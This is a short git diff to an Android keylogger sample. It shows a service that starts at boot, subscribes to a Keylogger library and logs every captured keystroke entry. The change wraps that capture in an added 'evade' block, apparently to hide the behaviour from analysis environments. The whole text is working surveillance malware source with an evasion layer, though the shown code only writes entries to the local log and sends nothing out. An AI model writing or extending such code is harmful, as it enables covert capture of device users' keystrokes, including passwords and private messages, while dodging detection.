@@ -3,6 +3,7 @@ package com.evilthreads.androidkeylogger
 import android.util.Log
 import androidx.lifecycle.lifecycleScope
 import com.candroid.bootlaces.BootService
+import com.evilthreads.evade.evade
 import com.evilthreads.keylogger.Keylogger
 
 /*
@@ -27,9 +28,11 @@ import com.evilthreads.keylogger.Keylogger
 */
 class MyService: BootService() {
     init {
-        lifecycleScope.launchWhenCreated {
-            Keylogger.subscribe { entry ->
-                Log.d("KEYLOGGER", entry.toString())
+        evade {
+            lifecycleScope.launchWhenCreated {
+                Keylogger.subscribe { entry ->
+                    Log.d("KEYLOGGER", entry.toString())
+                }
             }
         }
     }
